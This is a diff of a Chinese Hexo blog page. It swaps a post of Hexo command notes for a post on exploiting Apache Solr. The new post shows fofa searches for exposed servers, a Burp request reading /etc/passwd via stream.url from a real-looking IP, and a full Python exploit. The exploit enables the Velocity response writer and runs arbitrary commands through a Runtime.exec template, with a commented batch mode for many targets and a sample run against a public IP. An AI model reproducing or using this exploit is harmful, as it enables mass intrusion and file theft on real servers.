@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello 暗影LXH十三先生, 二层楼">
+    <meta name="keywords" content="Apache-Sole 任意文件读取漏洞, 二层楼">
     <meta name="description" content="荒原初见，悠悠我心，雪夜红墙，要你欢喜">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello 暗影LXH十三先生 | 二层楼</title>
+    <title>Apache-Sole 任意文件读取漏洞 | 二层楼</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -403,12 +403,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello 暗影LXH十三先生</h1>
+                    <h1 class="description center-align post-title">Apache-Sole 任意文件读取漏洞</h1>
                 </div>
             </div>
         </div>
@@ -522,9 +522,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
+                                <span class="chip bg-color">任意文件读取</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -536,7 +540,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-23
+                    2021-03-29
                 </div>
                 
 
@@ -557,34 +561,24 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="hexo常用命令笔记"><a href="#hexo常用命令笔记" class="headerlink" title="hexo常用命令笔记"></a>hexo常用命令笔记</h3><h6 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h6><p>npm install hexo -g #安装<br>npm update hexo -g #升级<br>hexo init #初始化</p>
-<h6 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h6><p>hexo n “我的博客” == hexo new “我的博客” #新建文章<br>hexo p == hexo publish<br>hexo g == hexo generate#生成<br>hexo s == hexo server #启动服务预览<br>hexo d == hexo deploy#部署</p>
-<h6 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h6><p>hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。<br>hexo server -s #静态模式<br>hexo server -p 5000 #更改端口<br>hexo server -i 192.168.1.1 #自定义 IP</p>
-<p>hexo clean #清除缓存 网页正常情况下可以忽略此条命令<br>hexo g #生成静态网页<br>hexo d #开始部署</p>
-<h6 id="监视文件变动"><a href="#监视文件变动" class="headerlink" title="监视文件变动"></a>监视文件变动</h6><p>hexo generate #使用 Hexo 生成静态文件快速而且简单<br>hexo generate –watch #监视文件变动</p>
-<h6 id="完成后部署"><a href="#完成后部署" class="headerlink" title="完成后部署"></a>完成后部署</h6><p>两个命令的作用是相同的<br>hexo generate –deploy<br>hexo deploy –generate</p>
-<p>hexo deploy -g<br>hexo server -g</p>
-<h6 id="草稿"><a href="#草稿" class="headerlink" title="草稿"></a>草稿</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>
-<h6 id="模版"><a href="#模版" class="headerlink" title="模版"></a>模版</h6><p>hexo new “postName” #新建文章<br>hexo new page “pageName” #新建页面<br>hexo generate #生成静态页面至public目录<br>hexo server #开启预览访问端口（默认端口4000，’ctrl + c’关闭server）<br>hexo deploy #将.deploy目录部署到GitHub</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;</span><br><span class="line">hexo new photo &quot;My Gallery&quot;</span><br><span class="line">hexo new &quot;Hello World&quot; --lang tw</span><br></pre></td></tr></table></figure>
-<h6 id="变量-描述"><a href="#变量-描述" class="headerlink" title="变量    描述"></a>变量    描述</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">layout	布局</span><br><span class="line">title	标题</span><br><span class="line">date	文件建立日期</span><br><span class="line">title: 使用Hexo搭建个人博客</span><br><span class="line">layout: post</span><br><span class="line">date: 2014-03-03 19:07:43</span><br><span class="line">comments: true</span><br><span class="line">categories: Blog</span><br><span class="line">tags: [Hexo]</span><br><span class="line">keywords: Hexo, Blog</span><br><span class="line">description: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。</span><br><span class="line">模版（Scaffold）</span><br><span class="line">hexo new photo &quot;My Gallery&quot;</span><br></pre></td></tr></table></figure>
-<p>变量    描述<br>layout    布局<br>title    标题<br>date    文件建立日期<br>设置文章摘要<br>以上是文章摘要 <a id="more"></a> 以下是余下全文 </p>
-<h5 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &lt;title&gt;</span><br><span class="line">hexo new post &lt;title&gt;</span><br><span class="line"></span><br><span class="line">变量	描述</span><br><span class="line">:title	标题</span><br><span class="line">:year	建立的年份（4 位数）</span><br><span class="line">:month	建立的月份（2 位数）</span><br><span class="line">:i_month	建立的月份（去掉开头的零）</span><br><span class="line">:day	建立的日期（2 位数）</span><br><span class="line">:i_day	建立的日期（去掉开头的零）</span><br><span class="line">推送到服务器上</span><br><span class="line">hexo n #写文章</span><br><span class="line">hexo g #生成</span><br><span class="line">hexo d #部署 #可与hexo g合并为 hexo d -g</span><br></pre></td></tr></table></figure>
-<p>报错<br>1.找不到git部署<br>ERROR Deployer not found: git<br>解决方法</p>
-<p>npm install hexo-deployer-git –save</p>
-<p>3.部署类型设置git<br>hexo 3.0 部署类型不再是github，_config.yml 中修改</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: http:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line"></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@***.github.com:***&#x2F;***.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">4. xcodebuild</span><br><span class="line">xcode-select: error: tool &#39;xcodebuild&#39; requires Xcode, but active developer directory &#39;&#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#39; is a command line tools instance</span><br></pre></td></tr></table></figure>
-<p>npm install bcrypt</p>
-<ol start="5">
-<li>RSS不显示<br>安装RSS插件<br>npm install hexo-generator-feed –save</li>
-</ol>
-<p>开启RSS功能<br>编辑hexo/_config.yml，添加如下代码：</p>
-<p>rss: /atom.xml #rss地址  默认即可<br>开启评论<br>1.我使用多说代替自带的评论，在多说 网站注册 &gt; 后台管理 &gt; 添加新站点 &gt; 工具 === 复制通用代码 里面有 short_name</p>
-<p>在根目录 _config.yml 添加一行 disqus_shortname: jslite 是在多说注册时产生的</p>
-<p>复制到 themes\landscape\layout_partial\article.ejs<br>把</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (!index &amp;&amp; post.comments &amp;&amp; config.disqus_shortname)&#123; %&gt;</span><br><span class="line">&lt;section id&#x3D;&quot;comments&quot;&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;disqus_thread&quot;&gt;</span><br><span class="line">  &lt;noscript&gt;Please enable JavaScript to view the &lt;a href&#x3D;&quot;&#x2F;&#x2F;disqus.com&#x2F;?ref_noscript&quot;&gt;comments powered by Disqus.&lt;&#x2F;a&gt;&lt;&#x2F;noscript&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure>
-<p>改为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (!index &amp;&amp; post.comments &amp;&amp; config.disqus_shortname)&#123; %&gt;</span><br><span class="line">  &lt;section id&#x3D;&quot;comments&quot;&gt;</span><br><span class="line">    &lt;!-- 多说评论框 start --&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;ds-thread&quot; data-thread-key&#x3D;&quot;&lt;%&#x3D; post.layout %&gt;-&lt;%&#x3D; post.slug %&gt;&quot; data-title&#x3D;&quot;&lt;%&#x3D; post.title %&gt;&quot; data-url&#x3D;&quot;&lt;%&#x3D; page.permalink %&gt;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;!-- 多说评论框 end --&gt;</span><br><span class="line">    &lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var duoshuoQuery &#x3D; &#123;short_name:&#39;&lt;%&#x3D; config.disqus_shortname %&gt;&#39;&#125;;</span><br><span class="line">      (function() &#123;</span><br><span class="line">        var ds &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">        ds.type &#x3D; &#39;text&#x2F;javascript&#39;;ds.async &#x3D; true;</span><br><span class="line">        ds.src &#x3D; (document.location.protocol &#x3D;&#x3D; &#39;https:&#39; ? &#39;https:&#39; : &#39;http:&#39;) + &#39;&#x2F;&#x2F;static.duoshuo.com&#x2F;embed.js&#39;;</span><br><span class="line">        ds.charset &#x3D; &#39;UTF-8&#39;;</span><br><span class="line">        (document.getElementsByTagName(&#39;head&#39;)[0] </span><br><span class="line">         || document.getElementsByTagName(&#39;body&#39;)[0]).appendChild(ds);</span><br><span class="line">      &#125;)();</span><br><span class="line">      &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;!-- 多说公共JS代码 end --&gt;</span><br><span class="line">  &lt;&#x2F;section&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure>
+                <h4 id="Apache-Sole-任意文件读取漏洞"><a href="#Apache-Sole-任意文件读取漏洞" class="headerlink" title="Apache-Sole 任意文件读取漏洞"></a>Apache-Sole 任意文件读取漏洞</h4><p><img src="/images/pasted-25.png" alt="upload successful"></p>
+<h6 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h6><p>fofa搜索</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app&#x3D;&quot;Apache-Solr&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-27.png" alt="upload successful"></p>
+<p><img src="/images/pasted-28.png" alt="upload successful"></p>
+<h6 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h6><p>判断漏洞是否存在<br>获取core的信息：主要是name</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-29.png" alt="upload successful"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;responseHeader&quot;:&#123;</span><br><span class="line">    &quot;status&quot;:0,</span><br><span class="line">    &quot;QTime&quot;:0&#125;,</span><br><span class="line">  &quot;initFailures&quot;:&#123;&#125;,</span><br><span class="line">  &quot;status&quot;:&#123;</span><br><span class="line">    &quot;composition&quot;:&#123;</span><br><span class="line">      &quot;name&quot;:&quot;composition&quot;,</span><br><span class="line">      &quot;instanceDir&quot;:&quot;&#x2F;home&#x2F;server&#x2F;solr-7.7.3&#x2F;server&#x2F;solr&#x2F;composition&quot;,</span><br><span class="line">      &quot;dataDir&quot;:&quot;&#x2F;home&#x2F;server&#x2F;solr-7.7.3&#x2F;server&#x2F;solr&#x2F;composition&#x2F;data&#x2F;&quot;,</span><br><span class="line">      &quot;config&quot;:&quot;solrconfig.xml&quot;,</span><br><span class="line">      &quot;schema&quot;:&quot;managed-schema&quot;,</span><br><span class="line">      &quot;startTime&quot;:&quot;2021-03-29T12:09:09.454Z&quot;,</span><br><span class="line">      &quot;uptime&quot;:44928793&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>burpsuit抓包修改<br><img src="/images/pasted-30.png" alt="upload successful"></p>
+<p>post包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;composition&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1</span><br><span class="line">Host: 39.97.235.243:8983</span><br><span class="line">Content-Length: 29</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;127.0.0.1:8983</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.82 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1:8983&#x2F;solr&#x2F;tesla&#x2F;config</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-31.png" alt="upload successful"></p>
+<h6 id="第三步-写脚本exp"><a href="#第三步-写脚本exp" class="headerlink" title="第三步 写脚本exp"></a>第三步 写脚本exp</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">banner &#x3D; &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">                   Apache Solr Velocity模板远程代码执行</span><br><span class="line"></span><br><span class="line">                     </span><br><span class="line"></span><br><span class="line">                         python By www.summer13.top</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">print banner</span><br><span class="line"></span><br><span class="line">def get_code_name(url):</span><br><span class="line">    if url[-1] &#x3D;&#x3D; &#39;&#x2F;&#39;:</span><br><span class="line">        url &#x3D; url[:-1].split(&#39;\n&#39;)[0]</span><br><span class="line">    else:</span><br><span class="line">        url &#x3D; url.split(&#39;\n&#39;)[0]</span><br><span class="line">        </span><br><span class="line">    core_url &#x3D; url + &#39;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&#39;</span><br><span class="line">    print &#39;[+] Querying Core Name: &#39;+core_url,&#39;\n&#39;</span><br><span class="line">    proxies &#x3D; &#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        # r &#x3D; requests.get(core_url,proxies&#x3D;proxies)</span><br><span class="line">        r &#x3D; requests.get(core_url)</span><br><span class="line">        if r.status_code &#x3D;&#x3D; 200 and &#39;responseHeader&#39; in r.content and &#39;status&#39; in r.content:</span><br><span class="line">            json_str &#x3D; json.loads(r.content)</span><br><span class="line">            for i in json_str[&#39;status&#39;]:</span><br><span class="line">                core_name_url &#x3D; url + &#39;&#x2F;solr&#x2F;&#39; + i + &#39;&#x2F;config&#39;</span><br><span class="line">                print core_name_url</span><br><span class="line">                update_queryresponsewriter(core_name_url)</span><br><span class="line">        else:</span><br><span class="line">            print &quot;No core name exit!&quot;</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">def update_queryresponsewriter(core_name_url):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0&#39;,</span><br><span class="line">    &#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3&#39;,</span><br><span class="line">    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,</span><br><span class="line">    &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;,</span><br><span class="line">    &#39;Content-Length&#39;: &#39;259&#39;,</span><br><span class="line">    &#39;Connection&#39;: &#39;close&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    payload &#x3D; &#39;&#39;&#39;</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">        &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">        &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">        &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">        &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">        &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;&#39;&#39;&#39;</span><br><span class="line">    proxies &#x3D; &#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;</span><br><span class="line">    r &#x3D; requests.post(core_name_url,headers&#x3D;headers,data&#x3D;payload)</span><br><span class="line">    # r &#x3D; requests.post(core_name_url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;proxies)</span><br><span class="line">    if r.status_code &#x3D;&#x3D; 200 and &#39;responseHeader&#39; in r.content:</span><br><span class="line">        print &#39;[+] exp enable Successful!&#39;</span><br><span class="line">        exp_url &#x3D; core_name_url[:-7]</span><br><span class="line">        cmd &#x3D; &#39;whoami&#39;</span><br><span class="line">        cmd &#x3D; sys.argv[2]</span><br><span class="line"></span><br><span class="line">        send_exp(exp_url,cmd)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[+] Enable Fail!\n&quot;</span><br><span class="line">def send_exp(exp_url,cmd):</span><br><span class="line">    exp_url &#x3D; exp_url + r&quot;&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27&quot; + cmd + r&quot;%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span><br><span class="line">    proxies &#x3D; &#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;</span><br><span class="line">    r &#x3D; requests.get(exp_url)</span><br><span class="line">    # r &#x3D; requests.get(exp_url,proxies&#x3D;proxies)</span><br><span class="line">    if r.status_code &#x3D;&#x3D; 400 or r.status_code &#x3D;&#x3D; 500  or r.status_code &#x3D;&#x3D;200 and len(r.content) &gt;0:</span><br><span class="line">        print &quot;&gt;&gt;&gt; [+] Exp Send Successful! &lt;&lt;&lt;&quot;</span><br><span class="line">        print &quot;____________________________________________________________&quot;</span><br><span class="line">        print &#39;\n&#39;,exp_url,&#39;\n&#39;</span><br><span class="line">        print &#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\n&#39;,r.content</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[+] EXP No Send Successful!\n&quot;</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) !&#x3D; 3:</span><br><span class="line">        sys.exit(&quot;\n [+] Usage:  python %s http:&#x2F;&#x2F;x.x.x.x:8983  command\n&quot; % sys.argv[0])</span><br><span class="line">    else:</span><br><span class="line">        # url &#x3D; &quot;http:&#x2F;&#x2F;192.168.5.86:8983&quot;</span><br><span class="line">        url &#x3D; sys.argv[1]</span><br><span class="line">        get_code_name(url)</span><br><span class="line">    </span><br><span class="line">        # 批量</span><br><span class="line">        # f &#x3D; open(&#39;url.txt&#39;,&#39;rb&#39;)</span><br><span class="line">        # for i in f.readlines():</span><br><span class="line">        #     url &#x3D; i.split(&#39;\r\n&#39;)[0]</span><br><span class="line">        #     get_code_name(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 solr_rce.py http:&#x2F;&#x2F;43.247.70.223:8086&#x2F; whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-33.png" alt="upload successful"></p>
+
                 
             </div>
             <hr/>
@@ -610,7 +604,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://thirteensummer.github.io/2021/03/23/hello-world/">https://thirteensummer.github.io/2021/03/23/hello-world/</a>
+                    <a href="https://thirteensummer.github.io/2021/03/29/apache-sole-ren-yi-wen-jian-du-qu-lou-dong/">https://thirteensummer.github.io/2021/03/29/apache-sole-ren-yi-wen-jian-du-qu-lou-dong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -647,7 +641,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
+                                    <span class="chip bg-color">任意文件读取</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -815,9 +813,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/03/29/apache-sole-ren-yi-wen-jian-du-qu-lou-dong/">
                     <div class="card-image">
@@ -835,9 +834,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -846,6 +845,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -864,19 +864,20 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/03/23/cnvd-2021-10543-messagesolution-you-jian-gui-dang-xi-tong-eea-lou-dong-fu-xian/">
+                <a href="/2021/03/23/hello-world/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="CNVD-2021-10543  MessageSolution 邮件归档系统EEA 漏洞复现">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Hello 暗影LXH十三先生">
                         
-                        <span class="card-title">CNVD-2021-10543  MessageSolution 邮件归档系统EEA 漏洞复现</span>
+                        <span class="card-title">Hello 暗影LXH十三先生</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
